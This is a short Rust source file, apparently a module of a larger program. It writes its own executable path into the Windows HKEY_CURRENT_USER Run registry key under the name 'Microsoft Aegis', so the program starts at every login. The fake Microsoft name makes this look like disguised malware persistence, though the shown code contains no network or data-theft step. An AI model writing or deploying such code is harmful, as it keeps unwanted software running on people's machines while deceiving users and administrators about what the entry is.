use winreg::{
    RegKey,
    enums::{HKEY_CURRENT_USER, KEY_WRITE},
};

pub fn startup() -> std::io::Result<()> {
    if cfg!(feature = "hook_to_startup") {
        let path = std::env::current_exe()?;
        let path_str = path.to_str().unwrap();

        let hk = RegKey::predef(HKEY_CURRENT_USER);
        let sub = hk.open_subkey_with_flags(
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            KEY_WRITE,
        )?;

        sub.set_value("Microsoft Aegis", &path_str)?;

        println!("Hooked to startup successfully.");
    }
    Ok(())
}
